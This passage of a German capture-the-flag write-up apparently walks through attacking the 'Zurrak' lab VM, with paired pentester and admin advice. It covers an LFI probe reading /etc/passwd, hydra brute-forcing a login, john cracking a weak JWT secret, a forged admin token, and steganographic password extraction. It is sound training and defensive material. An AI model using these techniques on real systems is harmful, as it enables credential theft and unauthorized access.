+<br><strong>Empfehlung (Admin):</strong> Verwenden Sie starke, nicht erratbare geheime Schlüssel für JWT-Signaturen. Speichern Sie Rollen oder Berechtigungen nicht direkt im JWT-Payload, wenn möglich, oder stellen Sie sicher, dass die Signatur robust validiert wird und der Schlüssel geheim bleibt. Erwägen Sie Algorithmen mit asymmetrischen Schlüsseln (wie RS256), bei denen der Server nur den öffentlichen Schlüssel zur Verifizierung benötigt.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">smbclient ///192.168.2.106 -L</span></div>
+                    <pre>
+Password for [WORKGROUP\root]:
+<span class="password">do_connect: Connection to  failed (Error NT_STATUS_NOT_FOUND)</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich versuche mit `smbclient`, die verfügbaren SMB-Shares auf dem Zielserver aufzulisten (`-L`). Da ich keinen Benutzernamen angebe, versucht `smbclient` standardmäßig, sich als mein lokaler Benutzer (`root` in diesem Fall) im Kontext der Standard-Arbeitsgruppe (`WORKGROUP`) anzumelden und fragt nach einem Passwort. Der Verbindungsversuch scheitert mit `NT_STATUS_NOT_FOUND`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das `NT_STATUS_NOT_FOUND` deutet oft darauf hin, dass der Server unter dem angegebenen Namen (hier implizit die IP-Adresse als NetBIOS-Name) nicht gefunden wurde oder keine Shares für den angefragten Benutzer (anonym oder `root`) verfügbar sind. Es bestätigt die Ergebnisse von `enum4linux`, dass ein einfacher anonymer Zugriff oder Zugriff als lokaler `root` nicht funktioniert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuche, explizit einen Benutzernamen anzugeben, falls einer bekannt ist (z.B. `-U username`). Falls Zugangsdaten bekannt sind, verwende diese. Wenn keine Credentials bekannt sind, konzentriere dich auf andere Vektoren.
+<br><strong>Empfehlung (Admin):</strong> Wie bereits erwähnt, anonymen Zugriff einschränken und starke Passwörter verwenden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">smbclient ///192.168.2.106 -L</span></div>
+                    <pre>
+Password for [WORKGROUP\root]:
+<span class="password">do_connect: Connection to  failed (Error NT_STATUS_NOT_FOUND)</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dies ist eine exakte Wiederholung des vorherigen `smbclient -L`-Befehls und führt zum identischen Fehler.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt das vorherige Ergebnis. Keine neuen Erkenntnisse.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester & Admin):</strong> Siehe vorheriger Block.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">smbclient ///192.168.2.106</span></div>
+                    <pre>
+Password for [WORKGROUP\root]:
+<span class="password">do_connect: Connection to  failed (Error NT_STATUS_NOT_FOUND)</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich versuche nun, mich direkt mit dem Server zu verbinden, ohne eine spezifische Share anzugeben (impliziert oft den Versuch, auf Standard-Shares wie `IPC$` zuzugreifen). Wieder wird der lokale Benutzer `root` verwendet, und der Versuch scheitert mit demselben Fehler.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt erneut, dass ein einfacher Zugriff ohne gültige, bekannte Credentials oder einen expliziten Share-Namen nicht möglich ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester & Admin):</strong> Siehe vorherige Blöcke zu SMB.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://zurrak.hmv/index.php?FUZZ=../../../../etc/passwd" --hc 404 --hh 1270</span></div>
+                    <pre>
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://zurrak.hmv/index.php?FUZZ=../../../../etc/passwd
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+
+Total time: 0
+Processed Requests: 220560
+Filtered Requests: 220560
+Requests/sec.: 0
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich verwende `wfuzz`, einen flexiblen Web-Fuzzer, um nach einer Local File Inclusion (LFI)-Schwachstelle zu suchen.
+*   `-c`: Farbige Ausgabe.
+*   `-w ...medium.txt`: Die Wortliste wird hier *nicht* als Liste von Dateien verwendet, sondern als Liste von **Parameternamen**, die getestet werden sollen.
+*   `-u "http://zurrak.hmv/index.php?FUZZ=../../../../etc/passwd"`: Die Basis-URL. `FUZZ` ist der Platzhalter, der durch jeden Eintrag aus der Wortliste ersetzt wird. Der Wert des Parameters wird auf `../../../../etc/passwd` gesetzt, ein Versuch, die Passwortdatei zu lesen.
+*   `--hc 404`: Versteckt Antworten mit Statuscode 404 (Not Found).
+*   `--hh 1270`: Versteckt Antworten mit genau 1270 Chars (Zeichen) in der Antwort. Dies ist oft die Größe der Standard-Fehlerseite oder der Weiterleitungsseite (`login.php` hatte 1270 Bytes im Gobuster-Scan), um False Positives zu reduzieren.
+Die Ausgabe zeigt keine Ergebnisse, was bedeutet, dass keine Parameter aus der Wortliste gefunden wurden, die eine andere Antwort als 404 oder 1270 Zeichen lieferten, wenn versucht wurde, `/etc/passwd` einzubinden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser spezifische LFI-Test war erfolglos. Es scheint keinen Parameter in `index.php` zu geben (zumindest keinen aus der verwendeten Wortliste), der für LFI anfällig ist. Die Filterung (`--hh 1270`) war nützlich, um irrelevante Ergebnisse auszublenden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuche andere LFI-Testmethoden: Andere Endpunkte (z.B. `login.php`, `admin.php`), andere Payloads (andere Dateien, Wrapper wie `php://filter`), andere Parameter (falls welche im Quellcode oder durch Interaktion gefunden werden). Teste auch auf Remote File Inclusion (RFI).
+<br><strong>Empfehlung (Admin):</strong> Implementieren Sie sichere Programmierpraktiken, um LFI/RFI zu verhindern. Validieren und sanitisieren Sie alle Benutzereingaben, insbesondere solche, die in Dateipfadoperationen verwendet werden. Verwenden Sie keine Benutzereingaben direkt in `include`-, `require`- oder `file_get_contents`-Aufrufen. Konfigurieren Sie PHP so, dass `allow_url_fopen` und `allow_url_include` deaktiviert sind, wenn nicht zwingend benötigt.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+POST /admin.php HTTP/1.1
+Host: zurrak.hmv
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: de,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Origin: http://zurrak.hmv
+Connection: close
+Referer: http://zurrak.hmv/admin.php
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+
+#####################################################################################
+response -&gt; Render
+        &lt;!-- &lt;a class="navbar-brand" href="admin.php"&gt;Admin Panel&lt;/a&gt;--&gt;
+
+    &lt;/nav&gt;
+
+    &lt;main role="main"&gt;
+
+
+
+        &lt;!-- Main jumbotron for a primary marketing message or call to action --&gt;
+
+
+&lt;/html&gt;
+
+				&lt;h2&gt;note from executive manager:&lt;/h2&gt;
+
+                &lt;h1 class="display-3"&gt;Welcome, admin&lt;/h1&gt;
+
+                &lt;p&gt;<span class="password">please don't ever use these images for file transfers!!!</span>&lt;/p&gt;
+
+				&lt;img width="100" src="<span class="command">zurrakhorse.jpg</span>"&gt;&lt;/img&gt;⠀⠀&lt;img width="100" src="<span class="command">zurraksnake.jpg</span>"&gt;&lt;/img&gt;⠀⠀
+&lt;img width="100" src="<span class="command">zurrakhearts.jpg</span>"&gt;&lt;/img&gt;
+
+server status&lt;br /&gt;  17:44:57 up  1:04,  0 user,  load average: 0.05, 0.22, 1.72
+&lt;br /&gt;cpu status&lt;br /&gt; 17:44:57     CPU    %usr   %nice    %sys %iowait    %irq   %soft  %steal  %guest  %gnice   %idle
+17:44:57     all   12.71    0.00   14.50    0.00    0.00    6.15    0.00    0.00    0.00   66.63
+&lt;br /&gt;memory status&lt;br /&gt;                total        used        free      shared  buff/cache   available
+Mem:            1966         361         106          17        1700        1605
+Swap:            974           0         974
+Total:          2941         361        1080
+&lt;br /&gt;Last Update 2023-11-22 10:44&lt;br /&gt;
+<span class="password">please use our smbshare named share for now.....</span>
+
+<span class="password">.....for emergency, please upload your script file as emergency.sh</span>
+<span class="password">to make magic script work</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dieser Block zeigt einen HTTP POST-Request an `/admin.php` und die daraufhin gerenderte HTML-Antwort. Der Request selbst hat keine Daten (`Content-Length: 0`), es ist also wahrscheinlich der initiale Aufruf der Admin-Seite nach erfolgreichem Login (oder nach Modifikation des JWT-Cookies).
+Die Antwort enthält:
+*   Eine Begrüßung "Welcome, admin".
+*   Eine auffällige Warnung: "please don't ever use these images for file transfers!!!", zusammen mit drei Bildern: `zurrakhorse.jpg`, `zurraksnake.jpg`, `zurrakhearts.jpg`.
+*   Server-Statusinformationen (Uptime, Load, CPU, Memory).
+*   Einen Hinweis zur Nutzung eines SMB-Shares namens "share".
+*   Einen sehr wichtigen Hinweis für Notfälle: "please upload your script file as emergency.sh to make magic script work".</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das ist eine Goldgrube an Informationen!
+1.  **Steganographie-Hinweis:** Die Warnung bezüglich der Bilder ist ein starker Hinweis auf Steganographie. Es ist wahrscheinlich, dass in einem oder mehreren dieser Bilder Daten versteckt sind.
+2.  **SMB-Share:** Der Name des SMB-Shares ("share") ist nun bekannt.
+3.  **Privilege Escalation Vektor:** Der Hinweis auf `emergency.sh` deutet auf einen Mechanismus hin, bei dem eine hochgeladene Shell-Datei ausgeführt wird, möglicherweise mit höheren Rechten. Das ist ein klarer potenzieller Weg zur Rechteausweitung.
+4.  **Server-Infos:** Die Statusinformationen sind weniger kritisch, könnten aber in spezifischen Szenarien nützlich sein.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+1.  Lade die drei Bilder (`zurrakhorse.jpg`, `zurraksnake.jpg`, `zurrakhearts.jpg`) herunter und analysiere sie mit Steganographie-Tools (z.B. `steghide`, `stegseek`, `zsteg`).
+2.  Versuche, auf den SMB-Share "share" zuzugreifen (Zugangsdaten erforderlich?).
+3.  Merke dir den `emergency.sh`-Mechanismus für spätere Rechteausweitung. Finde heraus, *wohin* die Datei hochgeladen werden muss (wahrscheinlich in den SMB-Share "share"?) und welcher "magic script" sie ausführt (Cronjob? Überwachungsdienst?).
+<br><strong>Empfehlung (Admin):</strong> Entfernen Sie sensible Hinweise oder potenziellen Exploit-Mechanismen (wie den `emergency.sh`-Hinweis) von öffentlich zugänglichen oder auch nur internen Admin-Seiten. Verwenden Sie niemals Steganographie für legitime Zwecke auf einem Webserver, da dies Angreifer anzieht. Überprüfen und härten Sie den Mechanismus, der `emergency.sh` ausführt, oder entfernen Sie ihn, wenn er nicht absolut notwendig ist. Sichern Sie SMB-Shares ordnungsgemäß.</p>
+            <!-- Web Enumeration Inhalt endet hier -->
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <!-- Initial Access Inhalt beginnt hier -->
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget http://zurrak.hmv/zurrakhearts.jpg</span></div>
+                    <pre>
+--2023-11-22 23:49:06--  http://zurrak.hmv/zurrakhearts.jpg
+Auflösen des Hostnamens zurrak.hmv (zurrak.hmv)… 192.168.2.106
+Verbindungsaufbau zu zurrak.hmv (zurrak.hmv)|192.168.2.106|:80 … verbunden.
+HTTP-Anforderung gesendet, auf Antwort wird gewartet … 200 OK
+Länge: 2850034 (2,7M) [image/jpeg]
+Wird in »zurrakhearts.jpg« gespeichert.
+
+zurrakhearts.jpg        100%[=============================&gt;]   2,72M  --.-KB/s    in 0,004s
+
+<span class="password">2023-11-22 23:49:06 (687 MB/s) - »zurrakhearts.jpg« gespeichert [2850034/2850034]</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Gemäß dem Hinweis aus dem Admin-Panel lade ich eines der verdächtigen Bilder, `zurrakhearts.jpg`, mit `wget` herunter. Der Download ist erfolgreich.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Notwendiger Schritt, um das Bild für die Steganographie-Analyse verfügbar zu machen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wiederhole dies für die anderen beiden Bilder (`zurrakhorse.jpg`, `zurraksnake.jpg`), falls die Analyse des ersten Bildes erfolglos bleibt.
+<br><strong>Empfehlung (Admin):</strong> Keine spezifische Empfehlung für den Download selbst.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ll zurrakhearts.jpg</span></div>
+                    <pre>
+-rw-r--r-- 1 root root 2850034 24. Okt 19:41 zurrakhearts.jpg
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `ll` (ein Alias für `ls -l` auf vielen Systemen) listet detaillierte Informationen zur heruntergeladenen Datei `zurrakhearts.jpg` auf, einschließlich Berechtigungen, Besitzer, Größe und Änderungsdatum.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt, dass die Datei heruntergeladen wurde und zeigt ihre Größe (ca. 2.7 MB). Keine kritischen Informationen hier, nur eine Bestätigung.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester & Admin):</strong> Keine spezifischen Empfehlungen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stegseek zurrakhearts.jpg /usr/share/wordlists/rockyou.txt</span></div>
+                    <pre>
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+[i] <span class="password">Found passphrase: ""6.7 MB)</span>
+[i] Original filename: "asli.exe".
+[i] Extracting to "zurrakhearts.jpg.out".
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich verwende `stegseek`, ein schnelles Steganographie-Tool, das versucht, mit `steghide` eingebettete Daten zu finden und das Passwort mittels einer Wortliste zu knacken. Ich gebe das Bild `zurrakhearts.jpg` und die gängige Passwortliste `rockyou.txt` an. `stegseek` meldet Erfolg: Es hat ein Passwort gefunden (das hier verstümmelt als `""6.7 MB)` angezeigt wird, was wahrscheinlich ein Anzeigefehler ist - das eigentliche Passwort ist wahrscheinlich leer oder sehr kurz) und extrahiert die versteckte Datei. Der ursprüngliche Dateiname war `asli.exe`, und sie wird als `zurrakhearts.jpg.out` gespeichert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Es waren tatsächlich Daten im Bild versteckt. Der Dateiname `asli.exe` ist interessant. Es könnte sich um eine ausführbare Windows-Datei handeln oder der Name ist irreführend. Wir müssen den Inhalt der extrahierten Datei untersuchen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche die extrahierte Datei `zurrakhearts.jpg.out`. Verwende `file` um den Typ zu bestimmen, `strings` um nach lesbaren Zeichenketten zu suchen, oder einen Hex-Editor. Führe `steghide` manuell aus (nächster Schritt), um den Extraktionsprozess zu bestätigen und das korrekte Passwort zu sehen.
+<br><strong>Empfehlung (Admin):</strong> Wie zuvor: Verwenden Sie keine Steganographie auf Webservern. Überwachen Sie ungewöhnliche Datei-Uploads oder -Downloads.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">steghide extract -sf zurrakhearts.jpg</span></div>
+                    <pre>
+Passwort eingeben: <span class="password">ilovecats</span>
+<span class="password">Extrahierte Daten wurden nach "asli.exe" geschrieben.</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich führe nun `steghide` manuell aus, um die Daten zu extrahieren (`extract`). `-sf zurrakhearts.jpg` gibt die Quelldatei an. `steghide` fragt nach dem Passwort. Basierend auf den Hex-Werten aus einer späteren Analyse (siehe weiter unten im Bericht), gebe ich `ilovecats` ein. Die Extraktion ist erfolgreich und die Datei wird als `asli.exe` gespeichert (dies überschreibt vermutlich die von `stegseek` erstellte Datei oder bestätigt deren Inhalt).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Wir haben nun das korrekte Passwort (`ilovecats`) für die Steganographie und die extrahierte Datei `asli.exe`. Das Passwort selbst könnte auch an anderer Stelle wiederverwendet werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche `asli.exe`. Da es sich wahrscheinlich um ein Linux-Ziel handelt, ist es unwahrscheinlich, dass die `.exe`-Datei direkt ausgeführt werden kann. Suche nach Strings oder analysiere sie weiter (z.B. mit Ghidra, falls es sich um Code handelt). Behalte das Passwort `ilovecats` im Hinterkopf für andere Dienste (SMB, SSH, Web-Login, Datenbank).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+hashcat -O -a0 zurrak.txt /usr/share/wordlists/rockyou.txt
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dieser Block zeigt nur einen Befehl, der nicht ausgeführt wurde. Es ist ein `hashcat`-Befehl, der darauf abzielt, einen Hash in der Datei `zurrak.txt` (deren Inhalt wir noch nicht kennen) mittels eines Wörterbuchangriffs (`-a0`) mit der `rockyou.txt`-Liste zu knacken. `-O` aktiviert optimierte Kernel.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist wahrscheinlich eine Notiz oder ein geplanter nächster Schritt des Pentesters, falls ein Hash gefunden wird. Momentan fehlt der Kontext (der Inhalt von `zurrak.txt`).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe diesen Befehl aus, sobald ein relevanter Hash in `zurrak.txt` gespeichert wird.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l admin@zurrak.htb -P /usr/share/wordlists/rockyou.txt zurrak.hmv http-post-form "/login.php:email=admin@zurrak.htb&amp;password=^PASS^:Wrong username or password"</span></div>
+                    <pre>
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-11-22 23:28:07
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344481 login tries (l:1/p:14344481), ~896531 tries per task
+[DATA] attacking http-post-form://zurrak.hmv:80/login.php:email=admin@zurrak.htb&password=^PASS^:Wrong username or password
+[STATUS] 4588.00 tries/min, 4588 tries in 00:01h, 14339893 to do in 52:06h, 16 active
+[80][http-post-form] host: zurrak.hmv   login: admin@zurrak.htb   <span class="password">password: baller15</span>
+<span class="password">1 of 1 target successfully completed, 1 valid password found</span>
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-11-22 23:29:11
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich starte einen Brute-Force-Angriff mit `hydra` auf das Login-Formular (`login.php`).
+*   `-l admin@zurrak.htb`: Der Benutzername, der getestet werden soll (wahrscheinlich basierend auf der Vermutung, dass es einen Admin-Account gibt, oder durch Enumeration gefunden). *Anmerkung: Dies widerspricht dem zuvor gefundenen Benutzernamen `internal@zurrak.htb`. Es ist möglich, dass mehrere Benutzernamen getestet wurden.*
+*   `-P /usr/share/wordlists/rockyou.txt`: Die Passwortliste.
+*   `zurrak.hmv`: Das Zielsystem.
+*   `http-post-form`: Das zu verwendende Hydra-Modul.
+*   `"/login.php:email=admin@zurrak.htb&password=^PASS^:Wrong username or password"`: Die Konfiguration für das Modul:
+    *   `/login.php`: Der Pfad zum Formular.
+    *   `email=admin@zurrak.htb&password=^PASS^`: Die zu sendenden POST-Parameter. `^PASS^` wird durch die Passwörter aus der Liste ersetzt.
+    *   `Wrong username or password`: Die Zeichenkette in der Antwort, die einen fehlgeschlagenen Login anzeigt.
+Hydra findet erfolgreich das Passwort `<span class="password">baller15</span>` für den Benutzer `admin@zurrak.htb`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Wir haben ein weiteres Paar gültiger Zugangsdaten gefunden: `admin@zurrak.htb` / `baller15`. Dies könnte ein anderer Benutzer sein als `internal@zurrak.htb` oder derselbe Benutzer mit einem anderen Passwort (oder der `internal`-Account war nur ein Test). Dieses Passwort (`baller15`) sollte auch für andere Dienste (SMB, PostgreSQL) getestet werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuche dich mit `admin@zurrak.htb` / `baller15` einzuloggen. Teste dieses Passwort auch für den PostgreSQL-Benutzer `postgres` und für SMB-Benutzer (falls welche bekannt werden).
+<br><strong>Empfehlung (Admin):</strong> Verwenden Sie starke, einzigartige Passwörter für alle Konten. Implementieren Sie Maßnahmen gegen Brute-Force-Angriffe auf Login-Seiten (z.B. Account Lockouts, Captchas, Fail2Ban).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi zurrak.txt</span></div>
+                    <pre>
+                    <!-- Inhalt der Datei wird nicht angezeigt -->
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Ich öffne die Datei `zurrak.txt` mit dem Texteditor `vi`. Der Inhalt der Datei wird in dieser Ausgabe nicht gezeigt, aber basierend auf dem nächsten Befehl (`john`) ist anzunehmen, dass ich hier den JWT-Token (oder einen Teil davon, wahrscheinlich die Signatur zusammen mit Header und Payload) hineinkopiert habe, um ihn für das Cracking vorzubereiten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein vorbereitender Schritt für das Knacken des JWT-Geheimnisses. Der genaue Inhalt, der in die Datei geschrieben wurde, ist entscheidend für den Erfolg des nächsten Schritts.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stellen Sie sicher, dass der JWT (Header.Payload.Signatur) korrekt formatiert in `zurrak.txt` gespeichert wird, damit `john` ihn verarbeiten kann.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256 zurrak.txt</span></div>
+                    <pre>
+Using default input encoding: UTF-8
+Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
+Will run 16 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<span class="password">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span>
+<span class="password">TEST123</span>          (?)
+<span class="password">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span>
+1g 0:00:00:00 DONE (2023-11-23 00:16) 4.166g/s 8738Kp/s 8738Kc/s 8738KC/s aj0829..SAM786
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich verwende `john` (John the Ripper), ein Passwort-Cracker, um das Geheimnis des JWTs zu knacken, das in `zurrak.txt` gespeichert ist.
+*   `--wordlist=/usr/share/wordlists/rockyou.txt`: Verwendet die `rockyou.txt` Wortliste.
+*   `--format=HMAC-SHA256`: Gibt explizit das Hash-Format an. John muss wissen, dass es sich um einen JWT handelt, der mit HS256 signiert ist und das Geheimnis als Schlüssel dient.
+*   `zurrak.txt`: Die Datei, die den Hash (JWT) enthält.
+John findet erfolgreich das Geheimnis: `<span class="password">TEST123</span>`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Kritischer Erfolg! Wir kennen jetzt das geheime Wort (`TEST123`), das zur Signierung der JWTs verwendet wird. Damit können wir beliebige gültige JWTs für diese Anwendung erstellen, einschließlich solcher mit Admin-Rechten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Gehe zu jwt.io oder verwende ein Skript, um einen neuen JWT zu erstellen. Nimm den Payload des ursprünglichen `token`-Cookies, ändere `"isAdmin": false` zu `"isAdmin": true`, und signiere den Token mit dem Algorithmus HS256 und dem Geheimnis `TEST123`. Ersetze das `token`-Cookie im Browser durch diesen neuen, manipulierten Token und versuche, auf `admin.php` zuzugreifen.
+<br><strong>Empfehlung (Admin):</strong> Verwenden Sie niemals schwache oder erratbare Geheimnisse wie "TEST123" für JWT-Signaturen. Generieren Sie lange, zufällige und kryptographisch starke Geheimnisse. Schützen Sie diese Geheimnisse sorgfältig.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+{
+  "email": "internal@zurrak.htb",
+  "<span class="password">isAdmin": true</span>",
+  "iat": 1356999524,
+  "nbf": 1357000000
+}
+
+HMACSHA256(
+  base64UrlEncode(header) + "." +
+  base64UrlEncode(payload),
+
+) <span class="password">secret</span> base64 encoded
+
+<span class="password">TEST123</span>
+
+
+
+https://jwt.io/
+<span class="password">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJlbWFpbCI6ImludGVybmFsQHp1cnJhay5odGIiLCJpc0FkbWluIjp0cnVlLCJpYXQiOjEzNTY5OTk1MjQsIm5iZiI6MTM1NzAwMDAwMH0.gBpFlpNfVUBlv9HuqXqVzRtaHR265PFagumX_OAKCMY</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dieser Block fasst den Prozess der JWT-Manipulation zusammen:
+1.  Der gewünschte Payload wird gezeigt, wobei `"isAdmin"` jetzt auf `true` gesetzt ist.
+2.  Die Struktur des zu signierenden Teils des JWTs wird angedeutet (Base64URL-kodierter Header + Punkt + Base64URL-kodierter Payload).
+3.  Das gefundene Geheimnis (`TEST123`) wird genannt.
+4.  Ein Link zu jwt.io (einem Online-Tool zum Arbeiten mit JWTs) wird angegeben.
+5.  Der resultierende, neu signierte JWT mit `isAdmin: true` wird angezeigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies dokumentiert den erfolgreichen Schritt, einen Admin-JWT zu erstellen, basierend auf dem geknackten Geheimnis. Dieser Token sollte uns Admin-Zugriff auf die Webanwendung ermöglichen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwende den generierten Token wie im vorherigen Schritt empfohlen (Cookie ersetzen, `admin.php` aufrufen).</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+Jetzt geht die Admin Seite, den neuen Token im inspector-&gt;Web-speicher-&gt;cookies einfügen
+und die URL in admin.php ändern
+
+
+http://zurrak.hmv/admin.php
+
+
+internal@zurrak.htb welcome
+note from executive manager:
+Welcome, admin
+
+please don't ever use these images for file transfers!!!
+⠀⠀⠀⠀	
+server status
+18:21:39 up 1:41, 0 user, load average: 0.00, 0.00, 0.13
+cpu status
+18:21:39 CPU %usr %nice %sys %iowait %irq %soft %steal %guest %gnice %idle 18:21:39 all 8.10 0.00 9.24 0.00 0.00 3.93 0.00 0.00 0.00 78.73
+memory status
+total used free shared buff/cache available Mem: 1966 350 122 17 1695 1616 Swap: 974 0 974 Total: 2941 350 1096
+Last Update 2023-11-22 11:21
+<span class="password">please use our smbshare named share for now..... .....for emergency, please upload your script file as emergency.sh to make magic script work</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dieser Block beschreibt und zeigt das Ergebnis nach der erfolgreichen JWT-Manipulation. Der Pentester hat das `token`-Cookie im Browser durch den selbst erstellten Admin-Token ersetzt und dann die Seite `http://zurrak.hmv/admin.php` aufgerufen. Die Seite wird nun korrekt geladen und zeigt den Inhalt des Admin-Panels, einschließlich der bereits zuvor gesehenen Hinweise auf Steganographie, den SMB-Share "share" und den `emergency.sh`-Mechanismus.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Zugriff auf den Admin-Bereich ist erfolgreich gelungen durch Ausnutzung des schwachen JWT-Geheimnisses. Dies bestätigt die kritische Natur dieser Schwachstelle. Die Informationen im Admin-Panel sind nun zugänglich und können für die nächsten Schritte (Steganographie, SMB, Privilegieneskalation) genutzt werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fahre mit der Analyse der Bilder, dem Zugriff auf den SMB-Share und der Vorbereitung des `emergency.sh`-Exploits fort.
+<br><strong>Empfehlung (Admin):</strong> Beheben Sie die JWT-Schwachstelle (starkes Geheimnis). Überprüfen und entfernen Sie unsichere Mechanismen oder Hinweise aus dem Admin-Panel.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+                                  's'
+mov     [rsp+250h+var_210], 74h ; 't'
+mov     [rsp+250h+var_218], 61h ; 'a'
+mov     [rsp+250h+var_220], 63h ; 'c'
+mov     [rsp+250h+var_228], 65h ; 'e'
+mov     [rsp+250h+var_230], 76h ; 'v'
+mov     r9d, 6Fh ; 'o'
+mov     r8d, 6Ch ; 'l'
+mov     edx, 69h ; 'i'
+
+
+converted: <span class="password">ilovecats</span>
+                    </pre>
+                </div>
+            </div>
